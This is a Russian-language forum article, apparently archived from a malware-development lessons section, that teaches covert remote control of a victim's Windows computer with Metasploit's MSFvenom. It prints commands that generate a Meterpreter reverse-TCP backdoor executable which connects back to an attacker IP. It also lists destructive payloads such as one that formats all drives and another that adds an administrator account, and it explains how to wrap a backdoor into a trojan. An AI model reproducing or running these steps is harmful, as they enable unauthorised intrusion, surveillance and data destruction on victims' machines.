+    </h3>
+
+    <div class="block-body" style="line-height:1.4;">
+
+      <!-- Email -->
+      <p style="margin:8px 0;">
+        ✉️ Email:
+        <a href="../../cdn-cgi/l/email-protection.html#0c65626a634c637f656278383e226f6361" style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          <span class="__cf_email__" data-cfemail="4b22252d240b243822253f7f7965282426">[email&#160;protected]</span>
+        </a>
+      </p>
+
+      <!-- TOR Mirror -->
+      <p style="margin:8px 0;">
+        🧅 TOR зеркало:
+        <a href="http://oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion/"
+           target="_blank"
+           rel="noopener noreferrer"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          oiiph5yud65awuv7vyzknbihyuumv5q2etcrgh6z4xmgnsul3chnigyd.onion
+        </a>
+      </p>
+
+      <!-- Donate -->
+      <p style="margin:8px 0;">
+        💰 Donate (BTC):
+        <a href="bitcoin:bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz"
+           style="color:#2ecc71;
+                  font-weight:bold;
+                  overflow-wrap:anywhere;
+                  text-decoration:none;">
+          bc1qm3mmvdp05d0q0y4ea3tw8rvrn2e0cpcmmmwxgz
+        </a>
+      </p>
+
+      <!-- Notice -->
+      <p style="margin:15px 0 0;
+                padding:10px;
+                border-radius:6px;
+                background:#ffeaea;
+                color:#c0392b;
+                font-weight:bold;
+                text-align:center;">
+        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
+      </p>
+
+    </div>
+  </div>
+</div>
+		</div>
+	</li>
+
+			
+		</ul>
+	
+
+			
+
+			
+
+			
+			
+	
+		<ul class="p-breadcrumbs "
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
+			<span itemprop="name">Уроки разработки вредоносного софта</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+
+			
+	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>
+
+			
+	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>
+
+
+			
+				<div class="p-body-header">
+					
+		<div class="contentRow contentRow--hideFigureNarrow">
+			<div class="contentRow-main">
+				<div class="p-title">
+					<h1 class="p-title-value">
+						
+							
+							Скрытое управление компьютером на Windows, адовая статья
+						
+					</h1>
+				</div>
+				
+					<div class="p-description">
+						
+							<ul class="listInline listInline--bullet">
+								<li>
+									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
+									<span class="u-srOnly">Автор</span>
+									
+										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
+									
+								</li>
+								
+								<li>
+									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
+									<span class="u-srOnly">Дата публикации</span>
+
+									<a href="index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-07-22T17:25:06+0300" data-timestamp="1753194306" data-date="22.07.2025" data-time="17:25" data-short="22 Июл" title="22.07.2025 в 17:25">22.07.2025</time></a>
+								</li>
+								
+																
+									<li>
+										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
+										<span class="u-srOnly">Article read time</span>
+
+										17 min read
+									</li>
+								
+								
+								
+							</ul>
+						
+					</div>
+				
+
+				
+
+	
+		
+	
+
+			</div>
+		</div>
+	
+				</div>
+				
+
+			<div class="p-body-main p-body-main--withSidebar ">
+				
+				<div class="p-body-contentCol"></div>
+				
+					<div class="p-body-sidebarCol"></div>
+				
+
+				
+
+				<div class="p-body-content">
+					
+					<div class="p-body-pageContent">
+
+
+
+
+
+
+
+
+
+	
+
+	
+
+
+
+	
+	
+
+	
+
+
+
+
+	
+
+
+
+
+	
+
+
+
+
+
+
+
+	
+
+
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+	
+		
+	
+	
+	
+
+
+	
+
+
+
+
+
+
+
+	
+		
+		
+
+		
+			<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
+			{
+				"lightbox_close": "Закрыть",
+				"lightbox_next": "Следующая",
+				"lightbox_previous": "Предыдущая",
+				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
+				"lightbox_start_slideshow": "Запустить слайд-шоу",
+				"lightbox_stop_slideshow": "Остановить слайд-шоу",
+				"lightbox_full_screen": "Полный экран",
+				"lightbox_thumbnails": "Миниатюры",
+				"lightbox_download": "Скачать",
+				"lightbox_share": "Поделиться",
+				"lightbox_zoom": "Увеличить",
+				"lightbox_new_window": "Новое окно",
+				"lightbox_toggle_sidebar": "Переключить боковую панель"
+			}
+			</script>
+		
+		
+	
+
+
+<div class="block">
+	
+
+	
+	
+		
+	
+	
+	
+	<div class="block-container">
+		<div class="block-body lbContainer js-articleBody"
+			data-xf-init="lightbox"
+			data-lb-id="article-56"
+			data-lb-caption-desc="0x42 &middot; 22.07.2025 в 17:25"
+			id="js-articleBody-56">
+
+			<div class="articleBody">
+				<article class="articleBody-main js-lbContainer">
+					
+					
+					
+					
+						
+
+	
+		
+	
+
+					
+
+					
+						
+
+						<div class="bbWrapper">Статья не новая, нашел на старом форуме, но не плохо описано всё.<br />
+<br />
+Возможно какие-то команды могут устареть, но думаю есть аналоги, читайте справку, в остальном всё актуально должно быть.)<br />
+<br />
+<b>1. Введение</b><br />
+<br />
+В этой заметке будет рассмотрен вопрос скрытого управление компьютером на Windows.<br />
+<br />
+Указанная задача может быть решена различными способами. В том числе с применением легитимных программ – к примеру, <a href="https://ru.wikipedia.org/wiki/Virtual_Network_Computing" target="_blank" class="link link--external" rel="noopener">VNC серверами</a>, <a href="https://ru.wikipedia.org/wiki/TeamViewer" target="_blank" class="link link--external" rel="noopener">TeamViewer</a> (если добавить в автозапуск и скрыть отображение иконки в трее), а также специализированного ПО, в том числе коммерческого. Здесь будет показано, как контролировать чужой компьютер используя <a href="https://kali.tools/?p=1551" target="_blank" class="link link--external" rel="noopener">Metasploit</a>.<br />
+<br />
+Статья не охватывает проблему доставки полезной нагрузки, инфицирования компьютера жертвы и вопросы предотвращения обнаружения, в том числе антивирусами. Главная цель этого материала – взглянуть на бэкдор глазами хакера для понимания принципов работы и значения угроз. Будет показано, как получить полный доступ над файловой системой, загружать или запускать любой файл, менять разнообразные системные настройки и даже выходить за пределы компьютера: делать снимки веб-камерой, делать видео- и аудио- захват с веб-камеры.<br />
+<br />
+На протяжении все статьи будет постоянно употребляться термин «полезная нагрузка» (payload) и некоторые другие. Поэтому начнём с определения этих понятий.<br />
+<br />
+<b>2. Что такое полезная нагрузка (payload)</b><br />
+<br />
+В статьях и учебниках по компьютерной безопасности можно часто встретить слово payload. Буквально оно переводится как «полезная нагрузка». Под этим словом подразумевают код или часть вредоносной программы (червей, вирусов), который непосредственно выполняет деструктивное действие: удаляет данные, отправляет спам, шифрует данные, открывает подключение для хакера и т.д. Вредоносные программы также имеют overhead code (буквально «служебный код»), под которым понимается та часть кода, которая отвечает за доставку на атакуемую машину, самостоятельное распространения вредоносной программы или препятствует обнаружению.<br />
+<br />
+Т.е. «полезная нагрузка» для пользователя («жертвы») является совсем не полезной.<br />
+<br />
+Для атакующего полезная нагрузка является ключевым элементом, который необходимо доставить на компьютер цели и выполнить. Код полезной нагрузки может быть написан самостоятельно (и это правильный подход, позволяющий значительно снизить шансы обнаружения антивирусами – в этом вы быстро убедитесь сами, если будете пробовать запускать исполнимые файлы с полезной нагрузкой в системах с установленным антивирусом), а можно воспользоваться разнообразными генераторами полезной нагрузки. Суть работы этих программ заключается в том, что вы выбираете типичную задачу (например, инициализация оболочки для ввода команд с обратным подключением), а генератор выдаёт вам исполнимый код под выбранную платформу. Если у вас нет навыков в программировании, то это единственный возможный вариант.<br />
+<br />
+Одним из самых популярных генераторов полезной нагрузки является <b>MSFvenom</b>. Это самостоятельная часть <b><a href="https://kali.tools/?p=1551" target="_blank" class="link link--external" rel="noopener">Metasploit</a></b>, предназначенная для генерации полезной нагрузки.<br />
+<br />
+<b>3. Что такое бэкдоры и трояны</b><br />
+<br />
+Бэкдор – это программа или технология, дающая несанкционированный доступ к компьютеру или другому устройству (роутер, телефон).<br />
+<br />
+В нашем случае, генерируемая с помощью MSFvenom полезная нагрузка является бэкдором.<br />
+<br />
+Троян – это программа, которая замаскирована под легитимную программу, но несёт в себе полезную нагрузку. Очень часто этой полезной нагрузкой является бэкдор.<br />
+<br />
+Т.е. если мы к файлу программы «Калькулятор», добавили полезную нагрузку – это будет троянская программа с бэкдором. Если мы сгенерировали полезную нагрузку, разместили на компьютере цели и, например, добавили файл в автозагрузку – то это будет бэкдор.<br />
+<br />
+Иногда термины троян и бэкдор используют как взаимозаменяемые. Антивирусные компании при наименовании вирусов обычно используют Trojan, даже если программа не маскируется под другую легитимную программу, а является чистым бэкдором, поскольку для доставления полезной нагрузки часто используется социальная инженерия – что вполне вписывается в концепцию Троянского Коня.<br />
+<br />
+Для целей этой статьи классификация на трояны и бэкдоры неважна. <b>MSFvenom </b>генерирует бэкдоры, но с ключом <b>-x</b> (позволяющим указывать пользовательский исполнимый файл для использования в качестве шаблона) можно генерировать трояны, у которых в качестве полезной нагрузки будет бэкдор.<br />
+<br />
+<b>4. Инструкция по использованию MSFvenom – генератора полезной нагрузки</b><br />
+<br />
+Msfvenom – это программа, которая комбинирует генерацию полезной нагрузки и кодирование. Она заменила две другие программы – <b>msfpayload </b>и <b>msfencode</b>, это произошло 8 июня 2015.<br />
+<br />
+Знакомство с программой начнём со справки по её опциям.<br />
+<br />
+Использование:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>/usr/bin/msfvenom [опции] &lt;переменная=значение&gt;</code></pre>
+	</div>
+</div>Опции:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>-p, --payload       &lt;полезная нагрузка&gt;    Используемая полезная нагрузка. Укажите &#039;-&#039; или stdin для использования пользовательской полезной нагрузки
+    --payload-options            Показывает список опций для полезной нагрузки
+-l, --list          [тип]       Выводит список типов модулей. Опциями являются: payloads, encoders, nops, all
+-n, --nopsled       &lt;длина&gt;     Подготовить nopsled [длинной] к полезной нагрузке
+-f, --format        &lt;формат&gt;     Формат вывода (используйте --help-formats для вывода форматов)
+    --help-formats               Показать список доступных форматов
+-e, --encoder       &lt;инкодер&gt;    Кодировщик для использования
+-a, --arch          &lt;arch&gt;       Архитектура для использования
+    --platform      &lt;платформа&gt;   Платформа полезной нагрузки
+    --help-platforms             Вывести списки платформ
+-s, --space         &lt;длина&gt;     Максимальная длина конечной полезной нагрузки
+    --encoder-space &lt;длина&gt;     Максимальная длина кодированной полезной нагрузки (по умолчанию используется значение из -s)
+-b, --bad-chars     &lt;список&gt;       Список символов, которые нужно избегать, пример: &#039;\x00\xff&#039;
+-i, --iterations    &lt;счётчик&gt;      Количество раз кодирования полезной нагрузки
+-c, --add-code      &lt;путь&gt;       Укажите дополнительный файл шеллкода win32 для внедрения
+-x, --template      &lt;путь&gt;       Указать пользовательский исполнимый файл для использования в качестве шаблона
+-k, --keep                       Сохранить template behavior и вставить полезную нагрузку как новый поток
+-o, --out           &lt;путь&gt;       Сохранить полезную нагрузку
+-v, --var-name      &lt;имя&gt;       Укажите имя пользовательской переменной, которое будет использоваться для определенных форматов вывода
+    --smallest                   Сгенерировать самую маленькую из возможных полезных нагрузок
+-h, --help                       Показать справку</code></pre>
+	</div>
+</div>В справке упоминается nopsled, вы можете найти дополнительную информацию о NOP slide в Википедии (хотя для наших целей это неважно).<br />
+<br />
+<b> 5. Как создать полезную нагрузку</b><br />
+<br />
+Для генерации полезной нагрузки обязательными являются два флага: <b>-p</b> and <b>-f</b>.<br />
+<br />
+Пример команды:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=IP_атакующего lport=4444 -f exe -o /tmp/my_payload.exe</code></pre>
+	</div>
+</div>Здесь:<br />
+<br />
+<ul>
+<li data-xf-list-type="ul"><b>-p windows/meterpreter/reverse_tcp</b> – выбранный тип полезной нагрузки</li>
+<li data-xf-list-type="ul"><b>lhost=IP_атакующего</b> – адрес атакующего, для обратного соединения с компьютера жертвы</li>
+<li data-xf-list-type="ul"><b>lport=4444</b> – порт, к которому будет делаться обратное соединение</li>
+<li data-xf-list-type="ul"><b>-f exe</b> – формат полезной нагрузки (исполнимый файл Windows)</li>
+<li data-xf-list-type="ul"><b>-o /tmp/my_payload.exe</b> – сохранить сгенерированный код в указанный файл</li>
+</ul><b> 6. Виды полезной нагрузки MSFvenom</b><br />
+<br />
+Как уже было сказано, флаг <b>-p</b> является обязательным. После него нужно указать то, чего мы хотим от полезной нагрузки.<br />
+<br />
+Чтобы вывести список всех полезных нагрузок, которые поддерживает платформа Metasploit, выполните команду:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -l payloads</code></pre>
+	</div>
+</div>Будет выведен такой список:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193868442.png"
+		data-src="https://osint42.org/attachments/1753193868442-png.778/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193868442-png.778/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193868442.png"
+			title="1753193868442.png"
+			width="1138" height="892" loading="lazy" />
+	</div><br />
+<br />
+Список длинный, включает в себя 486 пунктов (на момент написания) под самые разные платформы. Каждая запись состоит из двух столбцов: название полезной нагрузки (которое нужно указывать после опции <b>-p</b>) и её краткое описание.<br />
+<br />
+Название начинается с указания платформы, затем может идти используемая техника или архитектура, в самом конце будет указана основная цель полезной нагрузки. Например, запись <b>windows/meterpreter/reverse_tcp</b> означает внедрение DLL сервера meterpreter через Reflective Dll Injection payload, с образованием обратного соединения до атакующего. Говоря простыми словами, будет создан реверсивный (обратный) шелл до атакующего, который позволит ему управлять целевым компьютером через <b>meterpreter</b>.<br />
+<br />
+Слово <b>meterpreter </b>означает управление через Meterpreter (полное название Meta-Interpreter). Это многогранная программа, она является частью Metasploit с 2004. Работает она через dll внедрение. Скрипты и плагины загружаются и выгружаются динамически. Основы работы с Meterpreter будут раскрыты ниже.<br />
+<br />
+Во многих названиях используются слова <b>bind </b>и <b>reverse</b>. Слово <b>bind </b>означает, что на атакуемой машине процесс будет прослушивать определённый порт, ожидая, пока атакующий подключится к нему. А <b>reverse </b>означает, что на атакуемой машине процесс программы сам инициализирует соединение до атакующего. Поскольку многие файерволы настроены на разрешение исходящих соединений, то обратное (<b>reverse</b>) соединение даёт шанс обойти файервол.<br />
+<br />
+<br />
+Ключевое слово <b>vncinject </b>означает задействование технологии <a href="https://ru.wikipedia.org/wiki/Virtual_Network_Computing" target="_blank" class="link link--external" rel="noopener">Virtual Network Computing (VNC)</a> – удалённого доступа к рабочему столу.<br />
+<br />
+Если в имени полезной нагрузки присутствует <b>upexec</b>, значит её цель загрузить и выполнить исполнимый файл.<br />
+<br />
+<b>shell </b>означает открытие командной оболочки.<br />
+<br />
+Ключевое слово <b>dllinject </b>относится к технике Reflective DLL injection. При её использовании полезная нагрузка внедряется в запущенный процесс, прямо в оперативной памяти. При этом она никогда не касается жёстких дисков. Полезные нагрузки VNC и Meterpreter используют reflective DLL injection.<br />
+<br />
+В самом конце обычно стоит указание на используемый для соединения протокол, им может быть: <b>http</b>, <b>https</b>, <b>tcp</b>, <b>ipv6_tcp</b>, <b>tcp_dns</b>, <b>winhttp</b>, <b>winhttps </b>и другие варианты. Могут использоваться слова <b>proxy </b>(соответственно, соединение через прокси), <b>allports </b>(пробовать соединиться на всех возможных портах), <b>uuid </b>(соединение с поддержкой UUID).<br />
+<br />
+Имеется несколько специфичных полезных нагрузок:<br />
+<br />
+<ul>
+<li data-xf-list-type="ul"><b>windows/adduser</b>. Создаёт пользователя и добавляет его в группу локальных администраторов.</li>
+<li data-xf-list-type="ul"><b>windows/dns_txt_query_exec</b>. Выполняет TXT запросы к ряду DNS записей и выполняет полученную полезную нагрузку.</li>
+<li data-xf-list-type="ul"><b>windows/download_exec</b>. Загружает EXE с HTTP(S)/FTP URL и выполняет его.</li>
+<li data-xf-list-type="ul"><b>windows/exec</b>. Выполняет произвольную команду.</li>
+<li data-xf-list-type="ul"><b>windows/format_all_drives</b>. Форматирует все смонтированные в Windows диски (также известная как ShellcodeOfDeath). Если код по каким-либо причинам не может получить доступ к диску, то он пропускает диск и переходит к обработке следующего тома.</li>
+<li data-xf-list-type="ul"><b>windows/loadlibrary</b>. Загружает библиотеку по произвольному пути.</li>
+<li data-xf-list-type="ul"><b>windows/messagebox</b>. Показывает диалоговое сообщение через MessageBox, используя настраиваемый заголовок, текст и иконку.</li>
+</ul>По принципу работы, полезную нагрузку можно разделить на два типа:<br />
+<br />
+<ul>
+<li data-xf-list-type="ul">«выстрелил и забыл» (может быть доставлена, например, на USB носителе, не требует сетевого соединения)</li>
+<li data-xf-list-type="ul">требующую дополнительных действий пользователя после запуска</li>
+</ul>К «выстрелил и забыл» можно отнести форматирование всех дисков, выполнение определённых команд, создание нового пользователя.<br />
+<br />
+Большую группу составляют полезные нагрузки, открывающие доступ к оболочке, серверу meterpreter – после их запуска пользователь должен к ним подключиться для выполнения команд.<br />
+<br />
+<b> 7. Как узнать опции полезной нагрузки MSFvenom</b><br />
+<br />
+У многих полезных нагрузок имеются опции. Для их показа применяется флаг <b>--payload-options</b>. Также нужно использовать флаг <b>-p</b>, после которого нужно указать название интересующей полезной нагрузки.<br />
+<br />
+Примеры:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/messagebox --payload-options</code></pre>
+	</div>
+</div><br />
+<div class="bbImageWrapper  js-lbImage" title="1753193887905.png"
+		data-src="https://osint42.org/attachments/1753193887905-png.779/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193887905-png.779/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193887905.png"
+			title="1753193887905.png"
+			width="893" height="751" loading="lazy" />
+	</div><br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/meterpreter/reverse_tcp --payload-options</code></pre>
+	</div>
+</div><br />
+Будет выведено:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>Options for payload/windows/meterpreter/reverse_tcp:
+ 
+ 
+       Name: Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+     Module: payload/windows/meterpreter/reverse_tcp
+   Platform: Windows
+       Arch: x86
+Needs Admin: No
+ Total size: 281
+       Rank: Normal
+ 
+Provided by:
+    skape &lt;<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="3d5050545151584f7d55545e5613524f5a">[email&#160;protected]</a>&gt;
+    sf &lt;<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="1d6e69786d757873427b786a786f5d757c6f707273646e787e686f746964337e7270">[email&#160;protected]</a>&gt;
+    OJ Reeves
+    hdm &lt;<a href="../../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="5c241c343831723533">[email&#160;protected]</a>&gt;
+ 
+Basic options:
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: &#039;&#039;, seh, thread, process, none)
+LHOST                      yes       The listen address
+LPORT     4444             yes       The listen port
+ 
+Description:
+  Inject the meterpreter server DLL via the Reflective Dll Injection
+  payload (staged). Connect back to the attacker
+ 
+ 
+Advanced options for payload/windows/meterpreter/reverse_tcp:
+ 
+    Name                         Current Setting  Required  Description
+    ----                         ---------------  --------  -----------
+    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
+    AutoRunScript                                 no        A script to run automatically on session creation.
+    AutoSystemInfo               true             yes       Automatically capture system information on initialization.
+    AutoVerifySession            true             yes       Automatically verify and drop invalid sessions
+    AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
+    EnableStageEncoding          false            no        Encode the second stage payload
+    EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
+    HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
+    InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
+    PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
+    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
+    PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
+    PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
+    PrependMigrate               false            yes       Spawns and runs shellcode in new process
+    PrependMigrateProc                            no        Process to spawn and run shellcode in
+    ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
+    ReverseConnectRetries        5                yes       The number of connection attempts to try before exiting the process
+    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
+    ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
+    ReverseListenerComm                           no        The specific communication channel to use for this listener
+    ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
+    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
+    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
+    SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
+    SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
+    StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
+    StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
+    StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
+    VERBOSE                      false            no        Enable detailed status messages
+    WORKSPACE                                     no        Specify the workspace for this module
+Evasion options for payload/windows/meterpreter/reverse_tcp:
+ 
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------</code></pre>
+	</div>
+</div>Столбец <b>Required </b>показывает, является ли опция обязательной. Для некоторых опций предусмотрено значение по умолчанию. Если для обязательной опции отсутствует значение по умолчанию, то его нужно указать при генерации полезной нагрузки. Например, для <b>windows/meterpreter/reverse_tcp</b> нужно обязательно указать <b>LHOST</b>.<br />
+<br />
+Вспомним наш пример:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=IP_атакующего lport=4444 -f exe -o /tmp/my_payload.exe</code></pre>
+	</div>
+</div>В нём <b>lport=4444</b> можно было не указывать, поскольку всё равно применяется значение по умолчанию. А опция <b>LHOST </b>установлена как «<b>lhost=IP_атакующего</b>».<br />
+<br />
+<b> 8. Форматы полезной нагрузки</b><br />
+<br />
+Как уже было сказано, вторым обязательным флагом является <b>-f</b>. Он устанвливает формат полезной нагрузки.<br />
+<br />
+Чтобы вывести список всех поддерживаемых форматов, выполните команду:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom --help-formats</code></pre>
+	</div>
+</div>Будет выведено:<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>Executable formats
+    asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
+Transform formats
+    bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</code></pre>
+	</div>
+</div><br />
+<b>9. Примеры генерации полезной нагрузки в MSFvenom</b><br />
+<br />
+Один из популярных вариантов создания полезной нагрузки под Windows уже показан выше:<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=IP_атакующего lport=4444 -f exe -o backdoor.exe</code></pre>
+	</div>
+</div><br />
+Чтобы узнать ваш IP адрес, вы можете, например, воспользоваться командой<br />
+<i><b>ip a</b></i><br />
+<br />
+Чтобы узнать внешний IP:<br />
+<i><b>curl suip.biz/ip/</b></i><br />
+<br />
+Поскольку я моделирую атаку в локальной сети, то я буду использовать локальный IP компьютера с Kali Linux (192.168.0.196):<br />
+<i><b>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=4444 -f exe -o backdoor.exe</b></i><br />
+<br />
+Программа выведет:<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1753193905929.png"
+		data-src="https://osint42.org/attachments/1753193905929-png.780/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../attachments/1753193905929-png.780/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1753193905929.png"
+			title="1753193905929.png"
+			width="1033" height="149" loading="lazy" />
+	</div><br />
+<br />
+И будет создан файл backdoor.exe.<br />
+<br />
+Можно комбинировать несколько полезных нагрузок. Это позволяет сделать опция <b>-c</b>, которая указывает на файл с шеллколом win32, который должен быть включён в создаваемую полезную нагрузку.<br />
+<br />
+<br />
+Пример:<br />
